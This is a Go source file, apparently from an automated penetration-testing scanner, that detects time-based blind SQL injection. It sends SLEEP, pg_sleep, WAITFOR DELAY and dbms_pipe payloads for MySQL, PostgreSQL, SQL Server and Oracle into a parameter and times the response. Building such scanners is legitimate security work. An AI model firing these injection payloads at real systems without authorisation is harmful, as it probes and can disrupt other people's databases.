package detection

import (
	"context"
	"fmt"
	"time"

	"github.com/autonomouspen/scanner/internal/common"
	"github.com/autonomouspen/scanner/internal/httpclient"
	"github.com/autonomouspen/scanner/internal/scannerutil"
)

type TimeBasedEngine struct {
	client *httpclient.Client
}

func NewTimeBasedEngine(client *httpclient.Client) *TimeBasedEngine {
	return &TimeBasedEngine{
		client: client,
	}
}

func (e *TimeBasedEngine) Name() string {
	return "Time-Based SQLi"
}

func (e *TimeBasedEngine) Detect(target string, param common.InjectionPoint, scanner interface{}, ctx context.Context) (*common.Finding, error) {
	payloads := map[string]string{
		"MySQL":      "' AND SLEEP(5) --",
		"PostgreSQL": "' AND pg_sleep(5) --",
		"Microsoft SQL Server": "' WAITFOR DELAY '0:0:5' --",
		"Oracle":     "' AND dbms_pipe.receive_message(('a'),5) --",
	}

	for dbms, p := range payloads {
		injected := param.WithInjection(p)
		startTime := time.Now()
		resp, _, err := e.client.SendVerboseRequest(injected)
		if err != nil {
			continue
		}
		elapsedTime := time.Since(startTime)

		if elapsedTime > 5*time.Second {
			return &common.Finding{
				URL:        target,
				Parameter:  param.Name,
				Payload:    p,
				DBMS:       dbms,
				Type:       e.Name(),
				Evidence:   fmt.Sprintf("Response took %s", elapsedTime),
				Severity:   "High",
				Confidence: "High",
				Timestamp:  time.Now(),
				Request:    fmt.Sprintf("%+v", resp.Request),
				Response:   scannerutil.TruncateBody(""),
			}, nil
		}
	}

	return nil, nil
}
